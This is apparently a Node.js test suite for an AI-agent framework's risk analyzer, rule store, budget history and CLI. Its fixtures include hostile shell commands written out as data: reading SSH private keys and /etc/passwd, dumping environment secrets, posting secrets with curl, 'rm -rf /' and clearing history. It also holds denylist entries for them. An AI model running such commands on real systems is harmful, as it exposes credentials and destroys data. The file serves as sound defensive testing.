/**
 * Tests cho v1.01 (Đội T3) — phần 2: RiskRuleStore, budget history,
 * risk report, rule built-in mới, CLI `risk`.
 *
 * Covers:
 *  - `risk/store.ts` (lưu/tải rule custom + allow/deny, validate,
 *    file hỏng → rỗng, ghi đè theo id, disable built-in)
 *  - `risk/history.ts` (ghi snapshot cuối run, cộng dồn theo bot,
 *    ghi đè conversation trùng, file hỏng → rỗng, clear)
 *  - `risk/report.ts` (tóm tắt đếm đúng, Markdown + JSON đủ trường)
 *  - `risk/analyzer.ts` rule mới (env-dump, eval, ssh, docker, ...)
 *  - `apps/cli` lệnh `risk` end-to-end (check/rules/allow/deny/budget)
 *    qua spawn process thật với data-dir tạm.
 *
 * KHÔNG dùng CLI thật, KHÔNG đọc tài khoản/credential thật, KHÔNG gọi
 * API ngoài: mock + thư mục tạm.
 *
 * Run sau khi build core + cli:
 *   npm run build --workspace=@open-bot/core && npm run build --workspace=@open-bot/cli
 *   node --test tests/risk-budget-v101b.test.mjs
 */
import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

import {
  AgentCoordinator,
  ConversationBudgetHistory,
  ConversationBudgetMeter,
  RiskAnalyzer,
  RiskRuleStore,
  buildRiskReportJson,
  buildRiskReportMarkdown,
  summarizeRiskReport,
  validateStoredRiskRule,
  analyzeRisk,
} from '../packages/core/dist/index.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const repo = path.join(here, '..');
const cliJs = path.join(repo, 'apps/cli/dist/cli.js');

const tempDirs = [];
function makeTempDir(prefix = 'open-bot-v101b-') {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
}
after(() => {
  for (const dir of tempDirs) fs.rmSync(dir, { recursive: true, force: true });
});

function runCli(dataDir, args) {
  return execFileSync('node', [cliJs, ...args, '--data-dir', dataDir], {
    encoding: 'utf-8',
    timeout: 30_000,
  });
}

function runCliJson(dataDir, args) {
  return JSON.parse(runCli(dataDir, [...args, '--json']));
}

// ---------------------------------------------------------------------------
// RiskRuleStore
// ---------------------------------------------------------------------------

test('store: thêm/liệt kê/xoá rule, lưu bền qua instance mới', () => {
  const dir = makeTempDir();
  const store = new RiskRuleStore(dir);
  assert.deepEqual(store.listRules(), []);
  const saved = store.addRule({
    id: 'no-deploy',
    description: 'Không deploy thứ sáu.',
    level: 'high',
    score: 88,
    tool: 'shell_exec',
    argsPattern: 'deploy',
  });
  assert.equal(saved.id, 'no-deploy');
  assert.ok(fs.existsSync(path.join(dir, 'risk-rules.json')), 'file risk-rules.json đã ghi');

  const store2 = new RiskRuleStore(dir);
  assert.equal(store2.listRules().length, 1);
  assert.equal(store2.listRules()[0].description, 'Không deploy thứ sáu.');

  // Ghi đè theo id.
  store2.addRule({ id: 'no-deploy', description: 'Mới.', level: 'medium', score: 50 });
  assert.equal(store2.listRules().length, 1);
  assert.equal(store2.listRules()[0].level, 'medium');

  assert.equal(store2.removeRule('no-deploy'), true);
  assert.equal(store2.removeRule('no-deploy'), false, 'xoá lần 2 → false');
  assert.deepEqual(new RiskRuleStore(dir).listRules(), []);
});

test('store: rule hỏng bị từ chối (thiếu id / level lạ / score ngoài 0–100 / regex sai)', () => {
  const invalids = [];
  const store = new RiskRuleStore(undefined, {
    onInvalid: (reason) => invalids.push(reason),
  });
  assert.throws(() => store.addRule({ description: 'x', level: 'high', score: 50 }));
  assert.throws(() =>
    store.addRule({ id: 'a', description: 'x', level: 'critical', score: 50 }),
  );
  assert.throws(() => store.addRule({ id: 'a', description: 'x', level: 'high', score: 101 }));
  assert.throws(() =>
    store.addRule({ id: 'a', description: 'x', level: 'high', score: 50, argsPattern: '([bad' }),
  );
  assert.equal(store.listRules().length, 0);
  assert.ok(invalids.length >= 4, `onInvalid gọi ${invalids.length} lần`);
});

test('store: file hỏng JSON → store rỗng, không throw; entry regex sai bị loại', () => {
  const dir = makeTempDir();
  fs.writeFileSync(path.join(dir, 'risk-rules.json'), '{ hỏng json');
  const invalids = [];
  const store = new RiskRuleStore(dir, { onInvalid: (r) => invalids.push(r) });
  assert.deepEqual(store.listRules(), []);
  assert.ok(invalids.length > 0);

  // File có rule tốt + rule hỏng + entry allowlist regex sai.
  fs.writeFileSync(
    path.join(dir, 'risk-rules.json'),
    JSON.stringify({
      version: 1,
      rules: [
        { id: 'good', description: 'ok', level: 'medium', score: 50 },
        { id: 'bad', description: 'x', level: 'high', score: 50, argsPattern: '([bad' },
        { id: '', description: 'x', level: 'high', score: 50 },
      ],
      allowlist: ['read_file', 'bad:([regex'],
      denylist: ['shell_exec'],
      disabledBuiltinRuleIds: ['shell-sudo'],
    }),
  );
  const store2 = new RiskRuleStore(dir);
  assert.deepEqual(store2.listRules().map((r) => r.id), ['good']);
  assert.deepEqual(store2.listAllowlist(), ['read_file']);
  assert.deepEqual(store2.listDenylist(), ['shell_exec']);
  assert.deepEqual(store2.listDisabledBuiltinRuleIds(), ['shell-sudo']);
});

test('store: allow/deny thêm trùng không đúp, xoá đúng; disable/enable built-in', () => {
  const dir = makeTempDir();
  const store = new RiskRuleStore(dir);
  assert.equal(store.addAllowlist('read_file'), true);
  assert.equal(store.addAllowlist('read_file'), false, 'trùng → không đúp');
  assert.equal(store.addDenylist('shell_exec:rm'), true);
  assert.throws(() => store.addDenylist('shell_exec:([bad'));
  assert.equal(store.removeAllowlist('read_file'), true);
  assert.equal(store.removeAllowlist('read_file'), false);
  assert.deepEqual(store.listAllowlist(), []);
  assert.deepEqual(store.listDenylist(), ['shell_exec:rm']);

  assert.equal(store.disableBuiltinRule('shell-sudo'), true);
  assert.equal(store.disableBuiltinRule('shell-sudo'), false);
  assert.equal(store.enableBuiltinRule('shell-sudo'), true);
  assert.equal(store.enableBuiltinRule('shell-sudo'), false);
  assert.deepEqual(store.listDisabledBuiltinRuleIds(), []);
});

test('store: toAnalyzerOptions nối vào RiskAnalyzer — rule custom có hiệu lực', () => {
  const dir = makeTempDir();
  const store = new RiskRuleStore(dir);
  store.addRule({
    id: 'no-cat-passwd',
    description: 'Không cat /etc/passwd.',
    level: 'high',
    score: 93,
    tool: 'shell_exec',
    argsPattern: 'cat\\s+/etc/passwd',
  });
  store.addDenylist('elevate');
  const analyzer = new RiskAnalyzer(store.toAnalyzerOptions());
  const a = analyzer.analyze('shell_exec', { command: 'cat /etc/passwd' });
  assert.equal(a.level, 'high');
  assert.ok(a.matchedRuleIds.includes('no-cat-passwd'));
  assert.equal(analyzer.analyze('elevate', {}).denied, true);
});

test('store: không có dataDir → chỉ giữ trong bộ nhớ, không ghi file', () => {
  const store = new RiskRuleStore(undefined);
  assert.equal(store.path, undefined);
  store.addRule({ id: 'x', description: 'x', level: 'low', score: 10 });
  assert.equal(store.listRules().length, 1);
  // Không có file nào được tạo (không dataDir để ghi).
});

test('store: validateStoredRiskRule — rule không có điều kiện khớp vẫn giữ nhưng báo', () => {
  const notes = [];
  const rule = validateStoredRiskRule(
    { id: 'vague', description: 'không khớp gì', level: 'low', score: 5 },
    (r) => notes.push(r),
  );
  assert.ok(rule !== undefined, 'rule vô hại vẫn giữ (không bao giờ khớp)');
  assert.ok(notes.length > 0, 'có cảnh báo rule không khớp gì');
});

// ---------------------------------------------------------------------------
// ConversationBudgetHistory
// ---------------------------------------------------------------------------

function makeSnapshot(conversationId, totalTokens, costUsd, status = 'ok') {
  return {
    conversationId,
    model: 'gpt-4o-mini',
    inputTokens: totalTokens - 10,
    outputTokens: 10,
    totalTokens,
    costUsd,
    hasUnknownCost: costUsd === null,
    tokenLimit: null,
    costLimitUsd: null,
    tokenPercentUsed: null,
    costPercentUsed: null,
    percentUsed: null,
    status,
    modelCount: 1,
    byModel: {},
    lastRecordedAtMs: Date.now(),
  };
}

test('history: ghi + liệt kê + cộng dồn theo bot, cost null khi có model chưa có giá', () => {
  const dir = makeTempDir();
  const history = new ConversationBudgetHistory(dir);
  history.record('bot-1', makeSnapshot('c1', 100, 0.001));
  history.record('bot-1', makeSnapshot('c2', 200, 0.002, 'warning'));
  history.record('bot-2', makeSnapshot('c3', 50, null, 'exceeded'));
  assert.equal(history.size, 3);
  assert.equal(history.listForBot('bot-1').length, 2);
  assert.equal(history.get('c2')?.status, 'warning');

  const totals = history.totalsForBot('bot-1');
  assert.equal(totals.conversations, 2);
  assert.equal(totals.totalTokens, 300);
  assert.ok(Math.abs((totals.totalCostUsd ?? 0) - 0.003) < 1e-12);
  assert.equal(totals.warningCount, 1);
  assert.equal(totals.exceededCount, 0);

  const totals2 = history.totalsForBot('bot-2');
  assert.equal(totals2.totalCostUsd, null, 'model chưa có giá → tổng null, không $0 giả');
  assert.equal(totals2.hasUnknownCost, true);
  assert.equal(totals2.exceededCount, 1);

  const all = history.totalsAll();
  assert.equal(all.bots, 2);
  assert.equal(all.conversations, 3);
  assert.equal(all.totalTokens, 350);
});

test('history: ghi đè conversation trùng id; lưu bền qua instance mới; clear', () => {
  const dir = makeTempDir();
  const history = new ConversationBudgetHistory(dir);
  history.record('bot-1', makeSnapshot('c1', 100, 0.001));
  history.record('bot-1', makeSnapshot('c1', 150, 0.0015, 'warning'));
  assert.equal(history.size, 1, 'trùng conversationId → ghi đè, không đúp');
  assert.equal(history.get('c1')?.totalTokens, 150);

  const history2 = new ConversationBudgetHistory(dir);
  assert.equal(history2.size, 1);
  assert.equal(history2.get('c1')?.status, 'warning');

  history2.clear();
  assert.equal(history2.size, 0);
  assert.equal(new ConversationBudgetHistory(dir).size, 0);
});

test('history: file hỏng → rỗng, không throw', () => {
  const dir = makeTempDir();
  fs.writeFileSync(path.join(dir, 'budget-history.json'), 'không phải json');
  const history = new ConversationBudgetHistory(dir);
  assert.equal(history.size, 0);
  // Ghi tiếp vẫn hoạt động (ghi đè file hỏng).
  history.record('bot-1', makeSnapshot('c1', 10, 0.0001));
  assert.equal(history.size, 1);
});

// ---------------------------------------------------------------------------
// Risk report
// ---------------------------------------------------------------------------

test('report: tóm tắt đếm đúng; Markdown đủ mục; JSON đủ trường', () => {
  const audit = [
    { confirmationId: 'c1', callId: 'c1', botId: 'b1', toolName: 'write_file', riskLevel: 'medium', riskScore: 50, policy: 'confirm-risky', status: 'approved', decidedBy: 'user', atMs: 1000 },
    { confirmationId: 'c2', callId: 'c2', botId: 'b1', toolName: 'shell_exec', riskLevel: 'high', riskScore: 95, policy: 'confirm-risky', status: 'denied', decidedBy: 'user', atMs: 2000 },
    { confirmationId: 'c3', callId: 'c3', botId: 'b1', toolName: 'write_file', riskLevel: 'medium', riskScore: 50, policy: 'confirm-risky', status: 'edited', decidedBy: 'user', atMs: 3000, editedArgs: { path: 'b.md' } },
    { confirmationId: 'c4', callId: 'c4', botId: 'b1', toolName: 'delete_file', riskLevel: 'high', riskScore: 75, policy: 'confirm-risky', status: 'expired', decidedBy: 'timeout', atMs: 4000 },
  ];
  const meter = new ConversationBudgetMeter('conv-1', {});
  meter.record('gpt-4o-mini', 600, 200);
  const input = {
    botId: 'b1',
    conversationId: 'conv-1',
    audit,
    budget: meter.snapshot(),
    assessments: [analyzeRisk('read_file', { path: 'a.md' })],
  };
  const summary = summarizeRiskReport(input);
  assert.equal(summary.totalCalls, 4);
  assert.equal(summary.approved, 1);
  assert.equal(summary.denied, 1);
  assert.equal(summary.edited, 1);
  assert.equal(summary.expired, 1);
  assert.equal(summary.highRisk, 2);
  assert.equal(summary.mediumRisk, 2);
  assert.equal(summary.lowRisk, 1, 'assessment read_file low được tính');
  assert.equal(summary.totalTokens, 800);

  const md = buildRiskReportMarkdown(input);
  assert.ok(md.includes('# Risk report — bot b1'));
  assert.ok(md.includes('Đã duyệt: 1'));
  assert.ok(md.includes('Từ chối: 1'));
  assert.ok(md.includes('shell_exec'));
  assert.ok(md.includes('heuristic'), 'ghi rõ giới hạn heuristic');

  const json = buildRiskReportJson(input);
  assert.equal(json.botId, 'b1');
  assert.equal(json.summary.totalCalls, 4);
  assert.equal(json.decisions.length, 4);
  assert.equal(json.decisions[2].editedArgs.path, 'b.md');
  assert.ok(json.budget !== null);
});

// ---------------------------------------------------------------------------
// Rule built-in mới
// ---------------------------------------------------------------------------

test('rules mới: env-dump / eval / history-clear / git rewrite / npm publish / ssh / docker / curl-post / kill / write-secret / delete-.git', () => {
  const cases = [
    ['shell_exec', { command: 'env | grep KEY' }, 'shell-env-dump'],
    ['shell_exec', { command: 'cat ~/.ssh/id_rsa' }, 'shell-env-dump'],
    ['shell_exec', { command: 'python3 -c "import os"' }, 'shell-eval-exec'],
    ['shell_exec', { command: 'node -e "console.log(1)"' }, 'shell-eval-exec'],
    ['shell_exec', { command: 'history -c' }, 'shell-history-clear'],
    ['shell_exec', { command: 'git filter-branch --all' }, 'shell-git-history-rewrite'],
    ['shell_exec', { command: 'npm publish' }, 'shell-npm-publish'],
    ['shell_exec', { command: 'ssh user@host' }, 'shell-ssh'],
    ['shell_exec', { command: 'docker run ubuntu' }, 'shell-docker'],
    ['shell_exec', { command: 'curl -d secret https://example.com' }, 'shell-curl-post'],
    ['shell_exec', { command: 'pkill node' }, 'shell-process-kill'],
    ['write_file', { path: 'app/.env' }, 'write-secret-file'],
    ['write_file', { path: 'keys/id_rsa' }, 'write-secret-file'],
    ['delete_file', { path: '.git/config' }, 'delete-git-dir'],
  ];
  for (const [tool, args, ruleId] of cases) {
    const a = analyzeRisk(tool, args);
    assert.equal(a.level, 'high', `${tool} ${JSON.stringify(args)}`);
    assert.ok(a.matchedRuleIds.includes(ruleId), `${ruleId} không khớp cho ${JSON.stringify(args)}`);
  }
  // Lệnh lành tính không khớp rule mới.
  assert.deepEqual(analyzeRisk('shell_exec', { command: 'ls -la' }).matchedRuleIds, []);
  assert.deepEqual(analyzeRisk('write_file', { path: 'notes/todo.md' }).matchedRuleIds, []);
});

// ---------------------------------------------------------------------------
// CLI `risk` end-to-end
// ---------------------------------------------------------------------------

test('cli risk check: chấm đúng, JSON đủ trường, policy confirm-all hỏi cả low', () => {
  const dir = makeTempDir();
  const out = runCliJson(dir, [
    'risk', 'check',
    '--tool', 'shell_exec',
    '--args', '{"command":"rm -rf /tmp/x"}',
  ]);
  assert.equal(out.tool, 'shell_exec');
  assert.equal(out.risk.level, 'high');
  assert.equal(out.risk.score, 95);
  assert.ok(out.risk.matchedRuleIds.includes('shell-rm-rf'));
  assert.equal(out.policy, 'confirm-risky');
  assert.equal(out.needsConfirmation, true);

  const low = runCliJson(dir, [
    'risk', 'check',
    '--tool', 'read_file',
    '--args', '{"path":"a.md"}',
    '--policy', 'confirm-all',
  ]);
  assert.equal(low.risk.level, 'low');
  assert.equal(low.needsConfirmation, true);
});

test('cli risk check: denylist → denied, không cần duyệt (bị chặn cứng)', () => {
  const dir = makeTempDir();
  runCli(dir, ['risk', 'deny', 'add', 'shell_exec:rm']);
  const out = runCliJson(dir, [
    'risk', 'check',
    '--tool', 'shell_exec',
    '--args', '{"command":"rm -rf /"}',
  ]);
  assert.equal(out.risk.denied, true);
  assert.equal(out.needsConfirmation, false);
  const text = runCli(dir, ['risk', 'check', '--tool', 'shell_exec', '--args', '{"command":"rm -rf /"}']);
  assert.ok(text.includes('BỊ CHẶN'), 'text output nêu bị chặn');
});

test('cli risk rules: add → list → check khớp rule custom → remove', () => {
  const dir = makeTempDir();
  runCli(dir, [
    'risk', 'rules', 'add',
    '--id', 'no-deploy',
    '--level', 'high',
    '--score', '88',
    '--description', 'No deploy',
    '--tool', 'shell_exec',
    '--args-pattern', 'deploy',
  ]);
  const listed = runCliJson(dir, ['risk', 'rules', 'list']);
  assert.equal(listed.rules.length, 1);
  assert.equal(listed.rules[0].id, 'no-deploy');

  const checked = runCliJson(dir, [
    'risk', 'check',
    '--tool', 'shell_exec',
    '--args', '{"command":"deploy prod"}',
  ]);
  assert.ok(checked.risk.matchedRuleIds.includes('no-deploy'));
  assert.equal(checked.risk.score, 88);

  const removed = runCliJson(dir, ['risk', 'rules', 'remove', '--id', 'no-deploy']);
  assert.equal(removed.ok, true);
  assert.equal(runCliJson(dir, ['risk', 'rules', 'list']).rules.length, 0);
});

test('cli risk allow/deny: thêm/xoá, trùng không đúp', () => {
  const dir = makeTempDir();
  const added = runCliJson(dir, ['risk', 'allow', 'add', 'read_file']);
  assert.equal(added.changed, true);
  const dup = runCliJson(dir, ['risk', 'allow', 'add', 'read_file']);
  assert.equal(dup.changed, false, 'thêm trùng → không đổi');
  const removed = runCliJson(dir, ['risk', 'allow', 'remove', 'read_file']);
  assert.equal(removed.changed, true);
  const gone = runCliJson(dir, ['risk', 'allow', 'remove', 'read_file']);
  assert.equal(gone.changed, false);
});

test('cli risk budget: list rỗng khi chưa có run; totals rỗng', () => {
  const dir = makeTempDir();
  const listed = runCliJson(dir, ['risk', 'budget', 'list']);
  assert.deepEqual(listed.entries, []);
  const totals = runCliJson(dir, ['risk', 'budget', 'totals']);
  assert.equal(totals.conversations, 0);
  assert.equal(totals.totalTokens, 0);
});

test('cli risk budget: đọc được lịch sử coordinator đã ghi', () => {
  const dir = makeTempDir();
  const history = new ConversationBudgetHistory(dir);
  const meter = new ConversationBudgetMeter('conv-cli', {});
  meter.record('gpt-4o-mini', 600, 200);
  history.record('bot-9', meter.snapshot());
  const listed = runCliJson(dir, ['risk', 'budget', 'list', '--bot', 'bot-9']);
  assert.equal(listed.entries.length, 1);
  assert.equal(listed.entries[0].conversationId, 'conv-cli');
  assert.equal(listed.entries[0].totalTokens, 800);
  const totals = runCliJson(dir, ['risk', 'budget', 'totals', '--bot', 'bot-9']);
  assert.equal(totals.conversations, 1);
  assert.equal(totals.totalTokens, 800);
});

test('cli risk: thiếu tham số → exit 1, lỗi rõ', () => {
  const dir = makeTempDir();
  assert.throws(
    () => runCli(dir, ['risk', 'check']),
    /--tool/,
    'risk check thiếu --tool phải lỗi rõ',
  );
  assert.throws(
    () => runCli(dir, ['risk', 'rules', 'add', '--id', 'x']),
    /--level|--description/,
    'rules add thiếu level/description phải lỗi rõ',
  );
});

// ---------------------------------------------------------------------------
// Coordinator RPC: risk rules / confirmations / budget / report
// (handle() trực tiếp, dataDir tạm — không cần bot thật cho các RPC này)
// ---------------------------------------------------------------------------

function makeCoordinator() {
  const dataDir = makeTempDir('open-bot-v101-rpc-');
  const coordinator = new AgentCoordinator({
    dataDir,
    emit: () => {},
  });
  return { coordinator, dataDir };
}

test('rpc: listRiskRules mặc định chỉ có builtin, add/remove rule + validate', async () => {
  const { coordinator } = makeCoordinator();
  const list1 = await coordinator.handle('listRiskRules', {});
  assert.equal(Array.isArray(list1.rules), true);
  assert.equal(list1.rules.length, 0, 'chưa có rule custom');
  assert.deepEqual(list1.allowlist, []);
  assert.deepEqual(list1.denylist, []);
  // Rule custom hợp lệ.
  const added = await coordinator.handle('addRiskRule', {
    rule: {
      id: 'rpc-1',
      description: 'Chặn write vào thư mục bí mật',
      level: 'high',
      score: 95,
      tool: 'write_file',
      argsPattern: '/secret/',
    },
  });
  assert.equal(added.rule.id, 'rpc-1');
  const list2 = await coordinator.handle('listRiskRules', {});
  assert.equal(list2.rules.length, 1);
  assert.equal(list2.rules[0].tool, 'write_file');
  // Rule sai validate → throw (không lưu).
  await assert.rejects(
    coordinator.handle('addRiskRule', {
      rule: { id: 'rpc-bad', description: '', level: 'low', score: 5 },
    }),
    /description/,
  );
  const list3 = await coordinator.handle('listRiskRules', {});
  assert.equal(list3.rules.length, 1, 'rule lỗi không được lưu');
  // Xoá.
  const removed = await coordinator.handle('removeRiskRule', { id: 'rpc-1' });
  assert.equal(removed.removed, true);
  const removedAgain = await coordinator.handle('removeRiskRule', { id: 'rpc-1' });
  assert.equal(removedAgain.removed, false);
  // Param thiếu → throw rõ ràng.
  await assert.rejects(coordinator.handle('removeRiskRule', {}), /id/);
});

test('rpc: setRiskListEntry allow/deny add/remove + validate', async () => {
  const { coordinator } = makeCoordinator();
  const a1 = await coordinator.handle('setRiskListEntry', {
    list: 'allow',
    action: 'add',
    entry: 'read_file',
  });
  assert.equal(a1.changed, true);
  const a2 = await coordinator.handle('setRiskListEntry', {
    list: 'allow',
    action: 'add',
    entry: 'read_file',
  });
  assert.equal(a2.changed, false, 'thêm trùng không đổi');
  const d1 = await coordinator.handle('setRiskListEntry', {
    list: 'deny',
    action: 'add',
    entry: 'shell:rm -rf',
  });
  assert.equal(d1.changed, true);
  const list = await coordinator.handle('listRiskRules', {});
  assert.deepEqual(list.allowlist, ['read_file']);
  assert.deepEqual(list.denylist, ['shell:rm -rf']);
  const r1 = await coordinator.handle('setRiskListEntry', {
    list: 'deny',
    action: 'remove',
    entry: 'shell:rm -rf',
  });
  assert.equal(r1.changed, true);
  const list2 = await coordinator.handle('listRiskRules', {});
  assert.deepEqual(list2.denylist, []);
  await assert.rejects(
    coordinator.handle('setRiskListEntry', { list: 'x', action: 'add', entry: 'y' }),
    /allow\|deny/,
  );
});

test('rpc: listPendingConfirmations + getConfirmationAudit rỗng ban đầu', async () => {
  const { coordinator } = makeCoordinator();
  const pending = await coordinator.handle('listPendingConfirmations', {});
  assert.deepEqual(pending.confirmations, []);
  const audit = await coordinator.handle('getConfirmationAudit', {});
  assert.deepEqual(audit.audit, []);
});

test('rpc: listBudgetHistory + getBudgetTotals rỗng ban đầu, getRiskReport không crash', async () => {
  const { coordinator } = makeCoordinator();
  const history = await coordinator.handle('listBudgetHistory', {});
  assert.deepEqual(history.entries, []);
  const totals = await coordinator.handle('getBudgetTotals', { botId: 'bot-z' });
  assert.equal(totals.botId, 'bot-z');
  assert.equal(totals.conversations, 0);
  assert.equal(totals.totalTokens, 0);
  assert.equal(totals.totalCostUsd, null);
  const report = await coordinator.handle('getRiskReport', { botId: 'bot-z' });
  assert.equal(report.botId, 'bot-z');
  assert.equal(report.conversationId, null);
  assert.match(report.markdown, /bot-z/);
  assert.equal(report.summary.totalCalls, 0);
  assert.equal(report.summary.totalTokens, 0);
  await assert.rejects(coordinator.handle('getBudgetTotals', {}), /botId/);
  await assert.rejects(coordinator.handle('getRiskReport', {}), /botId/);
});

// ---------------------------------------------------------------------------
// Coordinator end-to-end: run ghi budget history + audit duyệt
// ---------------------------------------------------------------------------

test('coordinator run: budget history + audit được ghi sau run có tool call', async () => {
  const dataDir = makeTempDir('open-bot-v101-e2e-');
  const ws = path.join(dataDir, 'ws');
  fs.mkdirSync(ws, { recursive: true });
  const seen = [];
  const coordinator = new AgentCoordinator({
    dataDir,
    emit: (notification) => {
      if (notification.event === 'agent.event') seen.push(notification.data);
    },
  });
  await coordinator.createBot({
    bot: {
      id: 'bot-b',
      name: 'Bot B',
      providerId: 'mock',
      model: 'mock',
      systemPrompt: 'test',
      workspaceDir: ws,
      autoApprove: true,
      budgetTokenLimit: 1000,
    },
    provider: {
      id: 'mock',
      label: 'Mock',
      defaultModel: 'mock',
      mockResponses: [
        { text: '', toolCalls: [{ id: 'call-1', name: 'read_file', args: { path: 'x.md' } }] },
        { text: 'xong' },
      ],
    },
  });
  const result = await coordinator.run({ botId: 'bot-b', text: 'đọc file' });
  assert.equal(result.text, 'xong');
  // Budget history có 1 entry cho bot này (từ mock usage 0 token vẫn ghi).
  const history = await coordinator.handle('listBudgetHistory', { botId: 'bot-b' });
  assert.equal(history.entries.length, 1);
  assert.equal(history.entries[0].botId, 'bot-b');
  assert.equal(typeof history.entries[0].conversationId, 'string');
  const totals = await coordinator.handle('getBudgetTotals', { botId: 'bot-b' });
  assert.equal(totals.conversations, 1);
  // Report có summary (0 quyết định duyệt vì autoApprove=true, read=low).
  const report = await coordinator.handle('getRiskReport', { botId: 'bot-b' });
  assert.equal(report.summary.totalCalls, 0);
  assert.match(report.markdown, /bot-b/);
});

test('rpc: listBuiltinRiskRules + setRiskBuiltinRuleEnabled tắt/bật', async () => {
  const { coordinator } = makeCoordinator();
  const list1 = await coordinator.handle('listBuiltinRiskRules', {});
  assert.ok(Array.isArray(list1.rules));
  assert.ok(list1.rules.length >= 20, 'bảng built-in có ít nhất 20 rule');
  assert.ok(list1.rules.every((r) => r.enabled === true), 'mặc định tất cả built-in đều bật');
  assert.ok(list1.rules.some((r) => r.id === 'shell-rm-rf'), 'có rule shell-rm-rf');
  // Tắt rule rm-rf → listRiskRules thấy nó trong disabledBuiltinRuleIds.
  const off = await coordinator.handle('setRiskBuiltinRuleEnabled', { id: 'shell-rm-rf', enabled: false });
  assert.deepEqual(off, { id: 'shell-rm-rf', enabled: false });
  const list2 = await coordinator.handle('listBuiltinRiskRules', {});
  assert.equal(list2.rules.find((r) => r.id === 'shell-rm-rf').enabled, false);
  assert.ok(list2.rules.every((r) => r.id === 'shell-rm-rf' || r.enabled === true));
  const rules = await coordinator.handle('listRiskRules', {});
  assert.deepEqual(rules.disabledBuiltinRuleIds, ['shell-rm-rf']);
  // Bật lại.
  const on = await coordinator.handle('setRiskBuiltinRuleEnabled', { id: 'shell-rm-rf', enabled: true });
  assert.deepEqual(on, { id: 'shell-rm-rf', enabled: true });
  const list3 = await coordinator.handle('listBuiltinRiskRules', {});
  assert.equal(list3.rules.find((r) => r.id === 'shell-rm-rf').enabled, true);
  // Id không tồn tại / param sai → throw rõ ràng.
  await assert.rejects(
    coordinator.handle('setRiskBuiltinRuleEnabled', { id: 'khong-co', enabled: false }),
    /Không có rule built-in/,
  );
  await assert.rejects(
    coordinator.handle('setRiskBuiltinRuleEnabled', { id: 'shell-rm-rf', enabled: 'yes' }),
    /boolean/,
  );
});
